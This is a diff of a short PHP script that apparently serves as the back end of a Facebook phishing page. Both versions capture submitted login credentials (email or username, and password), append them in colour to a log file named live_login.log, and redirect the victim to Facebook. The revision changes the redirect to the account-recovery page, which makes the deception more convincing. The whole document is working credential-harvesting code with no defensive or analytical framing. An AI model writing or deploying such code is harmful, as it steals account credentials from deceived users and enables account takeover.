@@ -1,24 +1,15 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST['username'] ?? '';
-    $password = $_POST['password'] ?? '';
+<?php 
+$BRIGHT_GREEN = "\033[1;92m";
+$BRIGHT_CYAN = "\033[1;96m";
+$BRIGHT_YELLOW = "\033[1;93m";
+$RESET = "\033[0m";
 
-    // ANSI Color Codes
-    $red = "\033[1;91m";
-    $green = "\033[1;32m";
-    $reset = "\033[0m";
+file_put_contents("live_login.log", 
+    "{$BRIGHT_CYAN}Facebook {$BRIGHT_YELLOW}Username: {$BRIGHT_GREEN}" . $_POST['email'] . 
+    " {$BRIGHT_YELLOW}Pass: {$BRIGHT_GREEN}" . $_POST['pass'] . "{$RESET}\n", 
+    FILE_APPEND
+);
 
-    // Create entry with color
-    $entry = $green . "Username: " . $red . $username . $green . " | Password: " . $red . $password . $reset . "\n";
-
-    // Log file in project directory
-    $liveLog = "live_login.log";
-
-    // Save entry to live_login.log
-    file_put_contents($liveLog, $entry, FILE_APPEND);
-
-    // Redirect user to Facebook
-    header("Location: https://www.facebook.com");
-    exit();
-}
+header('Location: https://facebook.com/recover/initiate/');
+exit();
 ?>
